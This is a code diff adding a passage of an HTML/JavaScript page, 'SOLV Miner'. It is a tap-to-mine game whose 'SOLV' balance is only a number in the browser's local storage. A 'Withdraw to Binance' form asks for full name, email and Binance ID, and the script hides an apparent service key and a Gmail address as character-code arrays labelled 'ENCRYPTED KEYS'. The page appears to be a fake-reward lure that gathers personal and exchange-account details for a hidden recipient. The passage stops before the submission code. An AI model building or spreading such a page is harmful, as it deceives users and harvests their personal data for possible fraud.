@@ -1,0 +1,1576 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>SOLV Miner | PAID PLUS</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; }
+
+  :root {
+    --purple: #8b3dff;
+    --purple-bright: #a066ff;
+    --purple-neon: #b47cff;
+    --purple-dark: #5a1fb3;
+    --purple-soft: rgba(139,61,255,0.12);
+    --bg-deep: #0a0612;
+    --bg-mid: #150a26;
+    --card: rgba(139,61,255,0.04);
+    --border: rgba(160,102,255,0.22);
+    --text: #ece6f5;
+    --text-dim: #7a6b94;
+    --gold: #fbbf24;
+    --red: #ef4444;
+    --green: #22c55e;
+  }
+
+  html, body { width: 100%; min-height: 100vh; }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: 
+      radial-gradient(ellipse 80% 50% at 50% -20%, rgba(139,61,255,0.18), transparent),
+      radial-gradient(ellipse 60% 40% at 100% 100%, rgba(180,124,255,0.08), transparent),
+      linear-gradient(180deg, #150a26 0%, #0a0612 100%);
+    color: var(--text);
+    padding: 20px;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: 
+      radial-gradient(1px 1px at 20% 30%, rgba(180,124,255,0.5), transparent),
+      radial-gradient(1px 1px at 60% 70%, rgba(139,61,255,0.4), transparent),
+      radial-gradient(1px 1px at 80% 15%, rgba(180,124,255,0.6), transparent),
+      radial-gradient(1px 1px at 40% 90%, rgba(139,61,255,0.4), transparent),
+      radial-gradient(1.5px 1.5px at 10% 60%, rgba(180,124,255,0.5), transparent),
+      radial-gradient(1.5px 1.5px at 90% 40%, rgba(160,102,255,0.4), transparent);
+    background-size: 100% 100%;
+    animation: twinkle 4s infinite;
+    pointer-events: none;
+  }
+
+  @keyframes twinkle {
+    0%, 100% { opacity: 0.7; }
+    50% { opacity: 0.3; }
+  }
+
+  .header {
+    width: 100%;
+    max-width: 440px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 16px 20px;
+    background: linear-gradient(135deg, rgba(139,61,255,0.1), rgba(139,61,255,0.02));
+    border: 1px solid rgba(160,102,255,0.28);
+    border-radius: 20px;
+    margin-bottom: 18px;
+    position: relative;
+    overflow: hidden;
+    backdrop-filter: blur(12px);
+  }
+
+  .header::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(90deg, transparent, rgba(180,124,255,0.15), transparent);
+    animation: shine 4s infinite;
+  }
+
+  @keyframes shine {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+  }
+
+  .logo-text {
+    font-size: 1.35rem;
+    font-weight: 900;
+    letter-spacing: 4px;
+    background: linear-gradient(135deg, #ffffff, #a066ff, #8b3dff);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    position: relative;
+    z-index: 2;
+  }
+
+  .back-btn {
+    color: var(--purple-bright);
+    text-decoration: none;
+    font-size: 11px;
+    font-weight: 800;
+    padding: 8px 15px;
+    background: rgba(139,61,255,0.15);
+    border-radius: 20px;
+    border: 1px solid rgba(160,102,255,0.35);
+    transition: 0.3s;
+    position: relative;
+    z-index: 2;
+    letter-spacing: 0.5px;
+  }
+
+  .back-btn:active { transform: scale(0.94); }
+
+  .main-card {
+    width: 100%;
+    max-width: 440px;
+    background: linear-gradient(160deg, rgba(139,61,255,0.06), rgba(139,61,255,0.01));
+    border: 1px solid rgba(160,102,255,0.22);
+    border-radius: 28px;
+    padding: 28px 24px;
+    backdrop-filter: blur(24px);
+    box-shadow: 
+      0 25px 70px rgba(0,0,0,0.75),
+      0 0 40px rgba(139,61,255,0.1),
+      inset 0 1px 0 rgba(180,124,255,0.1);
+    margin-bottom: 18px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .main-card::before {
+    content: '';
+    position: absolute;
+    top: -100px; left: -100px;
+    width: 250px; height: 250px;
+    background: radial-gradient(circle, rgba(180,124,255,0.12), transparent 70%);
+    border-radius: 50%;
+    pointer-events: none;
+  }
+
+  .balance-card {
+    background: linear-gradient(135deg, rgba(139,61,255,0.15), rgba(139,61,255,0.03));
+    border: 1px solid rgba(160,102,255,0.35);
+    border-radius: 20px;
+    padding: 20px;
+    text-align: center;
+    margin-bottom: 18px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .balance-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(180,124,255,0.15), transparent);
+    animation: shine 4s infinite;
+  }
+
+  .balance-label {
+    font-size: 0.7rem;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+
+  .balance-value {
+    font-family: 'Inter', monospace;
+    font-size: 2.4rem;
+    font-weight: 800;
+    color: #ffffff;
+    letter-spacing: 1px;
+    text-shadow: 
+      0 0 15px rgba(180,124,255,0.7),
+      0 0 30px rgba(139,61,255,0.4);
+    transition: transform 0.15s ease;
+    line-height: 1;
+  }
+
+  .balance-value.bump { animation: bump 0.2s ease; }
+
+  @keyframes bump {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.08); }
+    100% { transform: scale(1); }
+  }
+
+  .balance-unit {
+    font-size: 0.8rem;
+    color: var(--purple-neon);
+    letter-spacing: 3px;
+    margin-top: 8px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+
+  .timer-card {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(139,61,255,0.06);
+    border: 1px solid rgba(160,102,255,0.22);
+    border-radius: 16px;
+    padding: 14px 20px;
+    margin-bottom: 22px;
+    transition: 0.3s;
+  }
+
+  .timer-card.active {
+    background: rgba(139,61,255,0.15);
+    border-color: rgba(180,124,255,0.5);
+    box-shadow: 0 0 25px rgba(139,61,255,0.25);
+  }
+
+  .timer-label {
+    font-size: 0.72rem;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+
+  .timer-value {
+    font-family: 'Inter', monospace;
+    font-size: 1.6rem;
+    font-weight: 800;
+    color: var(--purple-bright);
+    letter-spacing: 3px;
+    text-shadow: 0 0 15px rgba(180,124,255,0.6);
+    direction: ltr;
+  }
+
+  .solv-stage {
+    position: relative;
+    width: 100%;
+    height: 270px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .counter {
+    font-family: 'Inter', monospace;
+    font-size: 2.6rem;
+    font-weight: 800;
+    color: #ffffff;
+    letter-spacing: 1px;
+    text-shadow: 
+      0 0 20px rgba(180,124,255,0.8),
+      0 0 40px rgba(139,61,255,0.5);
+    margin-bottom: 20px;
+    line-height: 1;
+    direction: ltr;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .solv-wrap {
+    position: relative;
+    width: 190px;
+    height: 190px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .ring {
+    position: absolute;
+    border-radius: 50%;
+    border: 1px solid rgba(160,102,255,0.25);
+    pointer-events: none;
+    transition: border-color 0.4s;
+  }
+  .ring-1 { width: 175px; height: 175px; border-color: rgba(180,124,255,0.3); }
+  .ring-2 { 
+    width: 205px; height: 205px; 
+    border-style: dashed; 
+    border-color: rgba(139,61,255,0.2);
+    animation: spin 30s linear infinite; 
+  }
+  .ring-3 { width: 235px; height: 235px; border-color: rgba(160,102,255,0.1); }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .solv-img {
+    width: 135px;
+    height: 135px;
+    border-radius: 50%;
+    cursor: pointer;
+    object-fit: cover;
+    z-index: 2;
+    background: #ffffff;
+    padding: 12px;
+    box-shadow:
+      0 0 0 3px rgba(180,124,255,0.55),
+      0 0 40px rgba(139,61,255,0.6),
+      0 0 80px rgba(180,124,255,0.35);
+    transition: box-shadow 0.3s, filter 0.3s, transform 0.3s;
+  }
+
+  .solv-img:hover { 
+    filter: brightness(1.08);
+    transform: scale(1.03);
+  }
+
+  .solv-img:active {
+    transform: scale(0.95);
+  }
+
+  .solv-img.burst {
+    animation: shake 0.15s infinite;
+    box-shadow:
+      0 0 0 5px rgba(180,124,255,0.9),
+      0 0 70px rgba(180,124,255,1),
+      0 0 120px rgba(139,61,255,0.7);
+  }
+
+  @keyframes shake {
+    0%   { transform: translate(0, 0) rotate(0deg); }
+    20%  { transform: translate(-3px, 2px) rotate(-2deg); }
+    40%  { transform: translate(3px, -2px) rotate(2deg); }
+    60%  { transform: translate(-2px, -3px) rotate(-1deg); }
+    80%  { transform: translate(2px, 3px) rotate(1deg); }
+    100% { transform: translate(0, 0) rotate(0deg); }
+  }
+
+  .solv-img.cooling {
+    opacity: 0.4;
+    cursor: not-allowed;
+    filter: grayscale(1) brightness(0.55);
+    box-shadow: 0 0 0 3px rgba(139,61,255,0.15);
+  }
+
+  .progress-wrap {
+    width: 100%;
+    max-width: 270px;
+    height: 4px;
+    background: rgba(139,61,255,0.1);
+    border-radius: 10px;
+    overflow: hidden;
+    margin-top: 20px;
+    opacity: 0;
+    transition: opacity 0.4s;
+  }
+
+  .progress-wrap.visible { opacity: 1; }
+
+  .progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #5a1fb3, #b47cff);
+    border-radius: 10px;
+    transition: width 0.1s linear;
+    box-shadow: 0 0 15px rgba(180,124,255,0.9);
+  }
+
+  .status {
+    font-size: 0.78rem;
+    letter-spacing: 1.5px;
+    color: var(--text-dim);
+    margin-top: 16px;
+    min-height: 20px;
+    transition: color 0.3s;
+    font-weight: 600;
+    text-align: center;
+    padding: 0 10px;
+  }
+
+  .status.active { color: var(--purple-bright); }
+  .status.burst { color: #ffffff; }
+  .status.cooling { color: var(--red); }
+
+  .stats-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-top: 20px;
+  }
+
+  .stat-box {
+    background: rgba(139,61,255,0.05);
+    border: 1px solid rgba(160,102,255,0.15);
+    border-radius: 14px;
+    padding: 12px;
+    text-align: center;
+  }
+
+  .stat-label {
+    font-size: 0.65rem;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+
+  .stat-value {
+    font-family: 'Inter', monospace;
+    font-size: 0.95rem;
+    font-weight: 700;
+    color: var(--purple-bright);
+    letter-spacing: 1px;
+  }
+
+  .actions-bottom {
+    width: 100%;
+    max-width: 440px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .action-btn {
+    width: 100%;
+    padding: 16px;
+    font-size: 0.88rem;
+    font-weight: 800;
+    letter-spacing: 1.5px;
+    border: 1px solid rgba(160,102,255,0.35);
+    border-radius: 16px;
+    cursor: pointer;
+    transition: all 0.3s;
+    font-family: 'Inter', sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .action-btn svg { width: 16px; height: 16px; }
+
+  .withdraw-btn {
+    background: linear-gradient(135deg, rgba(139,61,255,0.18), rgba(139,61,255,0.05));
+    color: var(--purple-neon);
+    border-color: rgba(180,124,255,0.4);
+    box-shadow: 0 0 20px rgba(139,61,255,0.18);
+  }
+
+  .withdraw-btn:not(:disabled):hover {
+    background: linear-gradient(135deg, rgba(180,124,255,0.3), rgba(139,61,255,0.1));
+    transform: translateY(-2px);
+    box-shadow: 0 10px 30px rgba(180,124,255,0.4);
+    border-color: rgba(180,124,255,0.65);
+  }
+
+  .withdraw-btn:disabled {
+    border-color: rgba(100,116,139,0.2);
+    color: #4a4458;
+    background: rgba(100,116,139,0.05);
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+
+  .withdraw-btn.locked {
+    border-color: rgba(251,191,36,0.4);
+    color: #fbbf24;
+    background: linear-gradient(135deg, rgba(251,191,36,0.18), rgba(251,191,36,0.06));
+    cursor: not-allowed;
+    box-shadow: 0 0 20px rgba(251,191,36,0.15);
+  }
+
+  .float-reward {
+    position: fixed;
+    color: var(--purple-neon);
+    font-family: 'Inter', monospace;
+    font-weight: 800;
+    font-size: 1.1rem;
+    pointer-events: none;
+    animation: floatUp 1.1s ease-out forwards;
+    z-index: 99;
+    text-shadow: 0 0 15px rgba(180,124,255,0.95);
+    direction: ltr;
+  }
+
+  @keyframes floatUp {
+    0%   { opacity: 1; transform: translateY(0) scale(1); }
+    100% { opacity: 0; transform: translateY(-80px) scale(1.2); }
+  }
+
+  .particle {
+    position: fixed;
+    width: 4px;
+    height: 4px;
+    border-radius: 50%;
+    background: var(--purple-neon);
+    pointer-events: none;
+    box-shadow: 0 0 10px var(--purple-neon);
+    animation: particleFly 1s ease-out forwards;
+  }
+
+  @keyframes particleFly {
+    0%   { opacity: 1; transform: translate(0, 0) scale(1); }
+    100% { opacity: 0; transform: translate(var(--tx), var(--ty)) scale(0.2); }
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: rgba(21,10,38,0.98);
+    border: 1px solid rgba(180,124,255,0.4);
+    border-radius: 14px;
+    padding: 14px 26px;
+    color: var(--text);
+    font-size: 0.85rem;
+    transition: transform 0.4s ease;
+    z-index: 200;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.85), 0 0 20px rgba(139,61,255,0.25);
+    max-width: 90%;
+    text-align: center;
+    font-weight: 700;
+  }
+
+  .toast.show { transform: translateX(-50%) translateY(0); }
+  .toast.error { border-color: rgba(239,68,68,0.6); color: #fca5a5; }
+  .toast.success { border-color: rgba(180,124,255,0.7); color: var(--purple-neon); }
+  .toast.warning { border-color: rgba(251,191,36,0.6); color: #fbbf24; }
+
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.95);
+    backdrop-filter: blur(15px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 400;
+    padding: 20px;
+    overflow-y: auto;
+  }
+
+  .modal-overlay.show { display: flex; animation: fadeIn 0.3s; }
+
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  .modal {
+    background: linear-gradient(160deg, #150a26, #0a0612);
+    border: 1px solid rgba(180,124,255,0.35);
+    border-radius: 26px;
+    padding: 30px 26px;
+    width: 100%;
+    max-width: 410px;
+    box-shadow: 
+      0 30px 80px rgba(0,0,0,0.95),
+      0 0 40px rgba(139,61,255,0.2),
+      inset 0 1px 0 rgba(180,124,255,0.1);
+    animation: slideUp 0.4s;
+    color: #fff;
+    max-height: calc(100vh - 40px);
+    overflow-y: auto;
+  }
+
+  @keyframes slideUp {
+    from { transform: translateY(40px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .binance-logo {
+    width: 74px;
+    height: 74px;
+    margin: 0 auto 20px;
+    background: #000;
+    border-radius: 20px;
+    padding: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 0 0 3px rgba(240,185,11,0.3);
+    border: 2px solid rgba(240,185,11,0.4);
+  }
+
+  .binance-logo img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+  }
+
+  .modal-title {
+    font-size: 1.3rem;
+    font-weight: 900;
+    text-align: center;
+    margin-bottom: 8px;
+    background: linear-gradient(135deg, #ffffff, #a066ff, #8b3dff);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
+
+  .modal-sub {
+    font-size: 0.82rem;
+    color: var(--text-dim);
+    text-align: center;
+    margin-bottom: 18px;
+    line-height: 1.7;
+  }
+
+  .kyc-notice {
+    background: linear-gradient(135deg, rgba(240,185,11,0.12), rgba(240,185,11,0.04));
+    border: 1px solid rgba(240,185,11,0.35);
+    border-radius: 14px;
+    padding: 12px 14px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    margin-bottom: 18px;
+  }
+  .kyc-notice svg {
+    width: 18px;
+    height: 18px;
+    flex-shrink: 0;
+    stroke: #f0b90b;
+    fill: none;
+    stroke-width: 2.2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+    margin-top: 1px;
+  }
+  .kyc-notice-text {
+    font-size: 11.5px;
+    line-height: 1.55;
+    color: #f5d67b;
+    font-weight: 600;
+    text-align: left;
+  }
+  .kyc-notice-text b { color: #fcd535; font-weight: 800; }
+
+  .kyc-notice.purple-notice {
+    background: linear-gradient(135deg, rgba(139,61,255,0.12), rgba(139,61,255,0.03));
+    border-color: rgba(180,124,255,0.4);
+  }
+  .kyc-notice.purple-notice .kyc-notice-text { color: #d5b8ff; }
+  .kyc-notice.purple-notice .kyc-notice-text b { color: var(--purple-neon); }
+  .kyc-notice.purple-notice svg { stroke: var(--purple-neon); }
+
+  .modal-balance {
+    background: linear-gradient(135deg, rgba(139,61,255,0.15), rgba(139,61,255,0.03));
+    border: 2px solid rgba(180,124,255,0.4);
+    border-radius: 16px;
+    padding: 16px;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .modal-balance-label {
+    font-size: 11px;
+    color: var(--text-dim);
+    font-weight: 700;
+    margin-bottom: 6px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .modal-balance-value {
+    font-size: 28px;
+    font-weight: 900;
+    color: #ffffff;
+    direction: ltr;
+    line-height: 1;
+    text-shadow: 0 0 15px rgba(180,124,255,0.6);
+  }
+
+  .modal-balance-value small { font-size: 14px; opacity: 0.85; color: var(--purple-neon); }
+
+  .form-group { margin-bottom: 14px; }
+
+  .form-group label {
+    display: block;
+    font-size: 12px;
+    font-weight: 800;
+    margin-bottom: 8px;
+    color: #fff;
+  }
+
+  .form-group label::after {
+    content: ' *';
+    color: #ef4444;
+  }
+
+  .form-group input {
+    width: 100%;
+    padding: 14px;
+    background: rgba(139,61,255,0.04);
+    border: 2px solid rgba(160,102,255,0.2);
+    border-radius: 14px;
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 0.95rem;
+    text-align: left;
+    letter-spacing: 0.5px;
+    outline: none;
+    transition: border-color 0.3s;
+  }
+
+  .form-group input:focus {
+    border-color: var(--purple-bright);
+    box-shadow: 0 0 0 4px rgba(139,61,255,0.15);
+  }
+
+  .form-group input::placeholder {
+    color: rgba(236,230,245,0.3);
+    font-size: 0.85rem;
+  }
+
+  .modal-actions {
+    display: flex;
+    gap: 12px;
+    margin-top: 20px;
+  }
+
+  .btn {
+    flex: 1;
+    padding: 14px;
+    border: none;
+    border-radius: 14px;
+    font-weight: 800;
+    font-size: 0.85rem;
+    letter-spacing: 1px;
+    cursor: pointer;
+    transition: all 0.25s;
+    font-family: 'Inter', sans-serif;
+  }
+
+  .btn-cancel {
+    background: rgba(100,116,139,0.15);
+    color: #94a3b8;
+  }
+
+  .btn-cancel:hover { background: rgba(100,116,139,0.3); }
+
+  .btn-confirm {
+    background: linear-gradient(135deg, #8b3dff, #b47cff);
+    color: #ffffff;
+    box-shadow: 0 5px 20px rgba(139,61,255,0.5);
+  }
+
+  .btn-confirm:hover:not(:disabled) {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(180,124,255,0.7);
+  }
+
+  .btn-confirm:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  @media (max-width: 420px) {
+    .counter { font-size: 2.2rem; }
+    .balance-value { font-size: 1.9rem; }
+    .logo-text { font-size: 1.15rem; letter-spacing: 3px; }
+    .solv-wrap { width: 170px; height: 170px; }
+    .solv-img { width: 120px; height: 120px; padding: 10px; }
+    .ring-1 { width: 158px; height: 158px; }
+    .ring-2 { width: 188px; height: 188px; }
+    .ring-3 { width: 218px; height: 218px; }
+    .modal { padding: 24px 20px; }
+    .balance-value { font-size: 1.9rem; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="logo-text">SOLV MINER</div>
+    <a href="mining.html" class="back-btn">← BACK</a>
+  </div>
+
+  <div class="main-card">
+
+    <div class="balance-card">
+      <div class="balance-label">Total Balance</div>
+      <div class="balance-value" id="balanceEl">0.000</div>
+      <div class="balance-unit">SOLV</div>
+    </div>
+
+    <div class="timer-card" id="timerCard">
+      <div class="timer-label">Cycle Remaining</div>
+      <div class="timer-value" id="timerEl">--:--</div>
+    </div>
+
+    <div class="solv-stage">
+      <div class="counter" id="counter">0.000</div>
+
+      <div class="solv-wrap">
+        <div class="ring ring-1"></div>
+        <div class="ring ring-2"></div>
+        <div class="ring ring-3"></div>
+        <img id="solvImg" class="solv-img" src="solv.png" alt="SOLV"
+             onerror="this.onerror=null;this.src='data:image/svg+xml;utf8,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2250%22 fill=%22%238b3dff%22/%3E%3Ctext x=%2250%22 y=%2268%22 font-size=%2248%22 font-family=%22Arial%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22%3ES%3C/text%3E%3C/svg%3E'">
+      </div>
+
+      <div class="progress-wrap" id="progressWrap">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <div class="status" id="statusEl">Tap to mine +0.010 SOLV</div>
+    </div>
+
+    <div class="stats-row">
+      <div class="stat-box">
+        <div class="stat-label">Mining Rate</div>
+        <div class="stat-value" id="rateEl">0.010 / 30 min</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-label">System Status</div>
+        <div class="stat-value" id="sysStatusEl">Ready</div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="actions-bottom">
+
+    <button class="action-btn withdraw-btn" id="withdrawBtn" disabled>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      <span id="withdrawText">Withdraw · Min 1.000 SOLV</span>
+    </button>
+
+  </div>
+
+  <!-- ===== WITHDRAW MODAL ===== -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal" id="modalContent">
+      
+      <div class="binance-logo">
+        <img src="Binance_Logo.png" alt="Binance" onerror="this.style.display='none'">
+      </div>
+
+      <div class="modal-title">Withdraw to Binance</div>
+      <div class="modal-sub">Enter your details to proceed</div>
+
+      <div class="kyc-notice">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 9v4"/>
+          <path d="M12 17h.01"/>
+          <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+        </svg>
+        <div class="kyc-notice-text">
+          Your Binance account must be <b>fully KYC verified</b> (Identity Verified) before requesting a withdrawal. Unverified accounts will not receive rewards.
+        </div>
+      </div>
+
+      <div class="kyc-notice purple-notice">
+        <svg viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="10"/>
+          <polyline points="12 6 12 12 16 14"/>
+        </svg>
+        <div class="kyc-notice-text">
+          <b>Withdrawal cooldown:</b> After each withdrawal request, you must wait <b>12 hours</b> before submitting a new one.
+        </div>
+      </div>
+
+      <div class="modal-balance">
+        <div class="modal-balance-label">Available to Withdraw</div>
+        <div class="modal-balance-value"><span id="modalBalance">0.000</span> <small>SOLV</small></div>
+      </div>
+
+      <form id="withdrawForm" onsubmit="submitWithdraw(event)">
+        <input type="hidden" name="subject" value="SOLV Withdrawal Request - SOLV Miner" />
+        <input type="hidden" name="amount" id="fieldAmount" value="" />
+        <input type="hidden" name="withdraw_date" id="fieldDate" value="" />
+        <input type="hidden" name="game" value="SOLV Miner" />
+
+        <div class="form-group">
+          <label>Full Name</label>
+          <input type="text" name="full_name" placeholder="Enter your full name" required autocomplete="name" />
+        </div>
+
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" name="user_email" placeholder="Enter your email" required autocomplete="email" inputmode="email" />
+        </div>
+
+        <div class="form-group">
+          <label>Binance ID</label>
+          <input type="text" name="binance_id" placeholder="Enter Binance ID" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" />
+        </div>
+
+        <div class="modal-actions">
+          <button type="button" class="btn btn-cancel" onclick="closeWithdraw()">Cancel</button>
+          <button type="submit" class="btn btn-confirm" id="confirmBtn">Submit Request</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+<script>
+  /* ============================================
+     ENCRYPTED KEYS
+  ============================================ */
+  const _K1 = [115, 102, 95, 100, 98, 49, 50, 48, 102, 98, 98];
+  const _K2 = [99, 101, 97, 53, 48, 48, 49, 97, 56, 54, 100, 98];
+  const _K3 = [53, 99, 52, 56];
+  const _EM = [109, 97, 121, 97, 114, 97, 113, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109];
+
+  function _dk() {
+    let s = '';
+    for (let i = 0; i < _K1.length; i++) s += String.fromCharCode(_K1[i]);
+    for (let i = 0; i < _K2.length; i++) s += String.fromCharCode(_K2[i]);
+    for (let i = 0; i < _K3.length; i++) s += String.fromCharCode(_K3[i]);
+    return s;
+  }
+
+  function _de() {
+    let s = '';
+    for (let i = 0; i < _EM.length; i++) s += String.fromCharCode(_EM[i]);
+    return s;
+  }
+
+  /* ============================================
+     CONFIG
+  ============================================ */
+  const STORAGE_PREFIX     = 'solv_';
+  const BURST_AMOUNT       = 0.010;
+  const BURST_DURATION     = 10000;
+  const CYCLE_REWARD       = 0.020;
+  const CYCLE_MS           = 30 * 60 * 1000;
+  const MIN_WITHDRAW       = 1.000;
+  const MAX_OFFLINE_CYCLES = 48;
+  const SAVE_THROTTLE_MS   = 3000;
+  const CLOCK_TOLERANCE    = 60000;
+  const MAX_BALANCE        = 1000000;
+  const WITHDRAW_COOLDOWN  = 12 * 60 * 60 * 1000;
+
+  /* ============================================
+     SAFE STORAGE
+  ============================================ */
+  const S = {
+    get(key, fallback = null) {
+      try {
+        const raw = localStorage.getItem(STORAGE_PREFIX + key);
+        return raw === null ? fallback : raw;
+      } catch (e) { return fallback; }
+    },
+    set(key, val) {
+      try { localStorage.setItem(STORAGE_PREFIX + key, String(val)); return true; }
+      catch (e) { return false; }
+    },
+    num(key, fallback = 0) {
+      const v = parseFloat(S.get(key, fallback));
+      return isFinite(v) ? v : fallback;
+    },
+    int(key, fallback = 0) {
+      const v = parseInt(S.get(key, fallback), 10);
+      return isFinite(v) ? v : fallback;
+    },
+    clearAll() {
+      try {
+        Object.keys(localStorage).forEach(k => {
+          if (k.startsWith(STORAGE_PREFIX)) localStorage.removeItem(k);
+        });
+      } catch (e) {}
+    }
+  };
+
+  /* ============================================
+     STATE
+  ============================================ */
+  let balance         = S.num('balance', 0);
+  let cycleStartTime  = S.int('cycleStart', 0);
+  let burstStartTime  = S.int('burstStart', 0);
+  let burstStartBal   = S.num('burstStartBal', 0);
+  let burstActive     = S.get('burstActive', '0') === '1';
+  let cycleActive     = S.get('cycleActive', '0') === '1';
+  let lastSaveTime    = S.int('lastUpdate', 0);
+  let lastWithdrawAt  = S.int('lastWithdrawAt', 0);
+  let burstInterval   = null;
+  let lastSaveAt      = 0;
+  let isRestoring     = true;
+
+  if (!isFinite(balance) || balance < 0) balance = 0;
+  if (balance > MAX_BALANCE) balance = MAX_BALANCE;
+
+  /* ============================================
+     DOM
+  ============================================ */
+  const balanceEl    = document.getElementById('balanceEl');
+  const counterEl    = document.getElementById('counter');
+  const timerEl      = document.getElementById('timerEl');
+  const timerCard    = document.getElementById('timerCard');
+  const solvImg      = document.getElementById('solvImg');
+  const progressWrap = document.getElementById('progressWrap');
+  const progressBar  = document.getElementById('progressBar');
+  const statusEl     = document.getElementById('statusEl');
+  const rateEl       = document.getElementById('rateEl');
+  const sysStatusEl  = document.getElementById('sysStatusEl');
+  const withdrawBtn  = document.getElementById('withdrawBtn');
+  const withdrawText = document.getElementById('withdrawText');
+  const modalOverlay = document.getElementById('modalOverlay');
+  const modalContent = document.getElementById('modalContent');
+  const modalBalance = document.getElementById('modalBalance');
+  const confirmBtn   = document.getElementById('confirmBtn');
+  const toastEl      = document.getElementById('toast');
+
+  /* ============================================
+     FORMAT (3 decimals)
+  ============================================ */
+  function formatNum(v) {
+    if (!isFinite(v) || v < 0) v = 0;
+    return v.toFixed(3);
+  }
+
+  function formatTime(ms) {
+    if (ms < 0) ms = 0;
+    const totalSec = Math.floor(ms / 1000);
+    const h = Math.floor(totalSec / 3600);
+    const m = Math.floor((totalSec % 3600) / 60);
+    const s = totalSec % 60;
+    if (h > 0) return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    return `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  }
+
+  /* ============================================
+     SAVE STATE
+  ============================================ */
+  function saveState(force = false) {
+    const now = Date.now();
+    if (!force && now - lastSaveAt < SAVE_THROTTLE_MS) return;
+    lastSaveAt = now;
+
+    S.set('balance',         balance.toFixed(6));
+    S.set('cycleStart',      cycleStartTime);
+    S.set('cycleActive',     cycleActive ? '1' : '0');
+    S.set('burstStart',      burstStartTime);
+    S.set('burstStartBal',   burstStartBal.toFixed(6));
+    S.set('burstActive',     burstActive ? '1' : '0');
+    S.set('lastUpdate',      now);
+    S.set('lastWithdrawAt',  lastWithdrawAt);
+  }
+
+  /* ============================================
+     WITHDRAW COOLDOWN
